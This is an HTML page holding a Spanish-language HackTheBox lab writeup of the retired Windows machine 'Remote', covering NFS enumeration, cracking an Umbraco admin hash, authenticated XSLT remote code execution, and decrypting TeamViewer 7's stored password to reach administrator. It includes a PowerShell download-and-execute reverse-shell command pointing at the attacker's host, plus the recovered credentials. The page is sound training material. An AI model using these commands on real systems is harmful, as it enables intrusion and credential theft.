@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Remote — HackTheBox Writeup | Brandeiks</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Remote de HackTheBox (Windows, Fácil): NFS exporta /site_backups con la base Umbraco.sdf; el hash SHA1 del admin cae con rockyou, la RCE autenticada de XSLT (EDB 46153) da shell IIS, y TeamViewer 7 guarda la contraseña del administrador cifrada con AES en el registro.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/facil/remote.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Remote — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Remote de HackTheBox (Windows, Fácil): NFS exporta /site_backups con la base Umbraco.sdf; el hash SHA1 del admin cae con rockyou, la RCE autenticada de XSLT (EDB 46153) da shell IIS, y TeamViewer 7 guarda la contraseña del administrador cifrada con AES en el registro.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/facil/remote.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/remote.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Remote — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Remote de HackTheBox (Windows, Fácil): NFS exporta /site_backups con la base Umbraco.sdf; el hash SHA1 del admin cae con rockyou, la RCE autenticada de XSLT (EDB 46153) da shell IIS, y TeamViewer 7 guarda la contraseña del administrador cifrada con AES en el registro.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/remote.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Remote — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Remote de HackTheBox (Windows, Fácil): NFS exporta /site_backups con la base Umbraco.sdf; el hash SHA1 del admin cae con rockyou, la RCE autenticada de XSLT (EDB 46153) da shell IIS, y TeamViewer 7 guarda la contraseña del administrador cifrada con AES en el registro.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/remote.html", "image": "https://brandeiks.github.io/assets/og/remote.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/facil/remote.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../herramientas/index.html" class="nav-back">HERRAMIENTAS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>remote</span>
+    </div>
+    <h1 class="writeup-title">RE<span>MOTE</span></h1>
+    <p class="writeup-subtitle">// NFS → Umbraco.sdf → RCE XSLT (EDB 46153) → TeamViewer 7 (registro, AES) → Administrator</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-windows">WINDOWS</span>
+      <span class="meta-badge badge-smb">NFS</span>
+      <span class="meta-badge badge-cve">UMBRACO RCE</span>
+      <span class="meta-badge badge-creds">TEAMVIEWER AES</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li><li><a href="#puertos">02 · Puertos</a></li><li><a href="#paso1">03 · Reconocimiento</a></li><li><a href="#paso2">04 · NFS → base de Umbraco</a></li><li><a href="#paso3">05 · Crackeo del hash</a></li><li><a href="#paso4">06 · RCE autenticada en Umbraco</a></li><li><a href="#paso5">07 · TeamViewer 7 → contraseña de administrator</a></li><li><a href="#paso6">08 · Administrator</a></li><li><a href="#paso7">09 · Limpieza</a></li><li><a href="#datos">10 · Flags y credenciales</a></li><li><a href="#referencias">11 · Referencias</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Remote</span></div>
+      <div class="info-row"><span class="info-label">SISTEMA</span><span class="info-val val-cyan">Windows Server 2019</span></div>
+      <div class="info-row"><span class="info-label">ENTRADA</span><span class="info-val val-yellow">NFS /site_backups</span></div>
+      <div class="info-row"><span class="info-label">TÉCNICA</span><span class="info-val val-red">TeamViewer 7 (registro)</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">ESTADO</span><span class="info-val val-green">● Retirada</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">NFS → <span>Umbraco.sdf</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">hash SHA1 → <span>admin</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Umbraco RCE XSLT → <span>IIS</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">TeamViewer 7 AES → <span>administrator</span></div></div>
+      </div>
+    </div>
+  </aside>
+
+  <main id="main" class="writeup-content">
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p><strong>Resumen.</strong> NFS exporta <code style="color:var(--yellow)">/site_backups</code> &quot;para todos&quot; y ahí está el respaldo del sitio: la base <code style="color:var(--yellow)">Umbraco.sdf</code> con los hashes de los usuarios. El de <code style="color:var(--yellow)">admin@htb.local</code> es SHA1 y cae con rockyou (<code style="color:var(--yellow)">baconandcheese</code>). Con esas credenciales se entra al backoffice de <strong>Umbraco</strong> y se explota la RCE autenticada del visualizador de XSLT (<strong>EDB 46153</strong>), que ejecuta C# en el servidor → shell como <code style="color:var(--yellow)">iis apppool\defaultapppool</code>. En la máquina corre <strong>TeamViewer 7</strong>, que guarda la contraseña (AES-128-CBC con clave estática) en el registro: se descifra y resulta ser <strong>la del administrador local</strong> → WinRM/SMB como admin → root flag.</p></div>
+      <div class="info-box"><p class="info-box-title">// NOTA</p><p><strong>Versión simplificada (la usada):</strong> montar el NFS, <code style="color:var(--yellow)">strings</code> al <code style="color:var(--yellow)">.sdf</code>, <code style="color:var(--yellow)">hashcat</code>, el exploit de XSLT reescrito en Python 3 y un descifrado AES de 20 líneas. Sin Metasploit ni psexec: WinRM basta.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="puertos">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Puertos</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Puerto</th><th>Servicio</th></tr></thead><tbody>
+      <tr><td>21/tcp</td><td>FTP (anónimo, sin permisos de escritura)</td></tr>
+      <tr><td>80/tcp</td><td>IIS → Umbraco 7 (<code style="color:var(--yellow)">/umbraco</code> es el panel)</td></tr>
+      <tr><td>111/tcp</td><td>rpcbind (NFS)</td></tr>
+      <tr><td>2049/tcp</td><td><strong>NFS</strong> (<code style="color:var(--yellow)">/site_backups</code>)</td></tr>
+      <tr><td>445/tcp</td><td>SMB (sin acceso invitado)</td></tr>
+      <tr><td>5985/tcp</td><td>WinRM (admin)</td></tr>
+      <tr><td>47001/tcp</td><td>WinRM (HTTP)</td></tr>
+      </tbody></table>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso1">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.230.172
+sudo nmap -Pn -sV -p21,80,111,445,2049,5985 10.129.230.172
+showmount -e 10.129.230.172"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo nmap -sS -p- -n -Pn --min-rate 2500 --open 10.129.230.172</span></div><div><span class="prompt">$ </span><span class="cmd">sudo nmap -Pn -sV -p21,80,111,445,2049,5985 10.129.230.172</span></div><div><span class="prompt">$ </span><span class="cmd">showmount -e 10.129.230.172</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> NFS exporta <code style="color:var(--yellow)">/site_backups (everyone)</code>; la web es Umbraco (&quot;Acme Widgets&quot;).</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso2">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">NFS → base de Umbraco</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo mount -t nfs 10.129.230.172:/site_backups /mnt/site_backups
+sudo strings /mnt/site_backups/App_Data/Umbraco.sdf | head -8"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo mount -t nfs 10.129.230.172:/site_backups /mnt/site_backups</span></div><div><span class="prompt">$ </span><span class="cmd">sudo strings /mnt/site_backups/App_Data/Umbraco.sdf | head -8</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong></p></div>
+      <div class="output-block"><div>adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}...</div></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso3">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Crackeo del hash</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="echo &#x27;b8be16afba8c314ad33d812f22a04991b90e2aaa&#x27; &gt; admin.sha1
+hashcat -m 100 -a 0 admin.sha1 /usr/share/wordlists/rockyou.txt
+# b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">echo &#x27;b8be16afba8c314ad33d812f22a04991b90e2aaa&#x27; &gt; admin.sha1</span></div><div><span class="prompt">$ </span><span class="cmd">hashcat -m 100 -a 0 admin.sha1 /usr/share/wordlists/rockyou.txt</span></div><div><span class="comment"># b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">admin@htb.local</code> / <strong><code style="color:var(--yellow)">baconandcheese</code></strong> (el usuario es el email; <code style="color:var(--yellow)">admin</code> a secas no vale).</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso4">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">RCE autenticada en Umbraco</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p>El backoffice acepta un XSLT con C# (<code style="color:var(--yellow)">msxsl:script</code>) en <code style="color:var(--yellow)">/umbraco/developer/Xslt/xsltVisualize.aspx</code> y lo ejecuta:</p></div>
+      <div class="output-block"><div># umbraco_rce.py (Python 3, sin bs4)</div><div># 1) GET /umbraco/  -&gt; cookie UMB-XSRF-TOKEN</div><div># 2) POST /umbraco/backoffice/UmbracoApi/Authentication/PostLogin {username, password}</div><div># 3) GET  /umbraco/developer/Xslt/xsltVisualize.aspx -&gt; __VIEWSTATE / __VIEWSTATEGENERATOR</div><div># 4) POST con ctl00$body$xsltSelection = XSLT que hace System.Diagnostics.Process.Start</div></div>
+      <div class="cmd-block" data-cmd="python3 umbraco_rce.py &quot;/c powershell -c iex(new-object net.webclient).downloadstring(&#x27;http://10.10.16.12/shell.ps1&#x27;)&quot;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">python3 umbraco_rce.py &quot;/c powershell -c iex(new-object net.webclient).downloadstring(&#x27;http://10.10.16.12/shell.ps1&#x27;)&quot;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <code style="color:var(--yellow)">PS C:\windows\system32\inetsrv&gt;</code> como <strong><code style="color:var(--yellow)">iis apppool\defaultapppool</code></strong>.</p></div>
+      <div class="prose"><p><strong>Trampa:</strong> el <code style="color:var(--yellow)">POST</code> del XSLT <strong>se queda esperando</strong> mientras el comando sigue vivo (la reverse shell). Es normal: el shell llega igual.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso5">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">TeamViewer 7 → contraseña de administrator</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7).SecurityPasswordAES
+# 255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\TeamViewer\Version7).SecurityPasswordAES</span></div><div><span class="comment"># 255,155,28,115,214,107,206,49,172,65,62,174,19,27,70,79,88,47,108,226,209,225,243,218,126,141,55,107,38,57,78,91</span></div></div>
+      <div class="prose"><p>El cifrado es AES-128-CBC con clave y IV <strong>estáticos</strong>:</p></div>
+      <div class="cmd-block" data-cmd="openssl enc -d -aes-128-cbc \
+  -K 0602000000a400005253413100040000 \
+  -iv 0100010067244f436e6762f25ea8d704 \
+  -in tv.bin
+# UTF-16LE -&gt; !R3m0te!"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">openssl enc -d -aes-128-cbc \</span></div><div><span class="prompt">$ </span><span class="cmd">  -K 0602000000a400005253413100040000 \</span></div><div><span class="prompt">$ </span><span class="cmd">  -iv 0100010067244f436e6762f25ea8d704 \</span></div><div><span class="prompt">$ </span><span class="cmd">  -in tv.bin</span></div><div><span class="comment"># UTF-16LE -&gt; !R3m0te!</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> <strong><code style="color:var(--yellow)">!R3m0te!</code></strong>, la contraseña de <code style="color:var(--yellow)">administrator</code>.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso6">
+      <p class="section-label">// 08</p>
+      <h2 class="section-title">Administrator</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="nxc smb 10.129.230.172 -u administrator -p &#x27;!R3m0te!&#x27;
+# [+] remote\administrator:!R3m0te! (Pwn3d!)
+nxc winrm 10.129.230.172 -u administrator -p &#x27;!R3m0te!&#x27; -x &#x27;type C:\Users\Administrator\Desktop\root.txt&#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">nxc smb 10.129.230.172 -u administrator -p &#x27;!R3m0te!&#x27;</span></div><div><span class="comment"># [+] remote\administrator:!R3m0te! (Pwn3d!)</span></div><div><span class="prompt">$ </span><span class="cmd">nxc winrm 10.129.230.172 -u administrator -p &#x27;!R3m0te!&#x27; -x &#x27;type C:\Users\Administrator\Desktop\root.txt&#x27;</span></div></div>
+      <div class="prose"><p><strong>Lo que se encontró:</strong> root flag <strong><code style="color:var(--yellow)">[flag oculta]</code></strong>. *(Con <code style="color:var(--yellow)">psexec.py</code> sería <code style="color:var(--yellow)">nt authority\system</code>.)*</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="paso7">
+      <p class="section-label">// 09</p>
+      <h2 class="section-title">Limpieza</h2>
+      <div class="section-line"></div>
+      <div class="cmd-block" data-cmd="sudo umount /mnt/site_backups
+pkill -f &#x27;nc -lvnp 4444&#x27;; pkill -f &#x27;http.server 80 &#x27;"><button class="copy-btn" onclick="copyCmd(this)">COPIAR</button><span class="cmd-label">SHELL</span><div><span class="prompt">$ </span><span class="cmd">sudo umount /mnt/site_backups</span></div><div><span class="prompt">$ </span><span class="cmd">pkill -f &#x27;nc -lvnp 4444&#x27;; pkill -f &#x27;http.server 80 &#x27;</span></div></div>
+      <div class="prose"><p>No se modificó nada en la máquina (el XSLT se compila de forma transitoria).</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="datos">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Flags y credenciales</h2>
+      <div class="section-line"></div>
+      <table class="vuln-table"><thead><tr><th>Flag</th><th>Valor</th><th>Dónde</th></tr></thead><tbody>
+      <tr><td>user.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">C:\Users\Public\Desktop\user.txt</code></td></tr>
+      <tr><td>root.txt</td><td><code style="color:var(--yellow)">[flag oculta]</code></td><td><code style="color:var(--yellow)">C:\Users\Administrator\Desktop\root.txt</code></td></tr>
+      </tbody></table>
+      <div class="prose"><p><strong>Nota:</strong> en esta instancia <code style="color:var(--yellow)">user.txt</code> está en <code style="color:var(--yellow)">C:\Users\Public\Desktop\</code> (en el writeup original estaba en <code style="color:var(--yellow)">C:\Users\Public\</code>). Si no aparece, <code style="color:var(--yellow)">where /r C:\Users user.txt</code>.</p></div>
+      <div class="prose"><p><strong>Credenciales encontradas</strong></p></div>
+      <table class="vuln-table"><thead><tr><th>Cuenta</th><th>Credencial</th><th>Cómo</th></tr></thead><tbody>
+      <tr><td>Umbraco</td><td><code style="color:var(--yellow)">admin@htb.local</code> / <code style="color:var(--yellow)">baconandcheese</code></td><td>SHA1 de <code style="color:var(--yellow)">Umbraco.sdf</code> (NFS)</td></tr>
+      <tr><td><code style="color:var(--yellow)">administrator</code></td><td><code style="color:var(--yellow)">!R3m0te!</code></td><td>TeamViewer 7 (AES del registro)</td></tr>
+      </tbody></table>
+      <div class="info-box"><p class="info-box-title">// RUTA DE ATAQUE</p><p>NFS <code style="color:var(--yellow)">/site_backups</code> → <code style="color:var(--yellow)">Umbraco.sdf</code> → SHA1 → <code style="color:var(--yellow)">baconandcheese</code> → RCE XSLT (EDB 46153) → IIS → TeamViewer AES → <code style="color:var(--yellow)">!R3m0te!</code> → Administrator.</p></div>
+    </div>
+    <hr class="divider">
+    <div class="section" id="referencias">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Referencias</h2>
+      <div class="section-line"></div>
+      <div class="prose"><p>- [0xdf — Remote](https://0xdf.gitlab.io/2020/09/05/htb-remote.html) · [x3m1sec](https://x3m1sec.gitbook.io/notes/ctfs/hack-the-box/windows/medium/remote) · [coldfusionx](https://coldfusionx.github.io/posts/RemoteHTB/) · [sosawa](https://zenn.dev/sosawa/articles/9b522346ad71e8)</p></div>
+    </div>
+  <div class="writeup-nav" aria-label="Navegación entre writeups"><a class="anterior" href="postman.html"><span class="dir">← ANTERIOR</span><span class="nombre">Postman</span></a><a class="siguiente" href="timelapse.html"><span class="dir">SIGUIENTE →</span><span class="nombre">Timelapse</span></a></div>
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup de Remote · HackTheBox</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
+
+<script>
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) { toast = document.createElement('div'); toast.className = 'toast'; document.body.appendChild(toast); }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK'; btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => { btn.textContent = 'COPIAR'; btn.classList.remove('copied'); }, 1800);
+    }).catch(() => { showToast('Error al copiar'); });
+  }
+</script>
+<script id="datos-writeup" type="application/json">{"nombre": "REMOTE", "plataforma": "hackthebox", "dificultad": "facil", "url": "https://brandeiks.github.io/writeups/hackthebox/facil/remote.html"}</script>
+<script src="../../../assets/cursor.js" defer></script>
+<script src="../../../assets/writeup.js" defer></script>
+</body>
+</html>
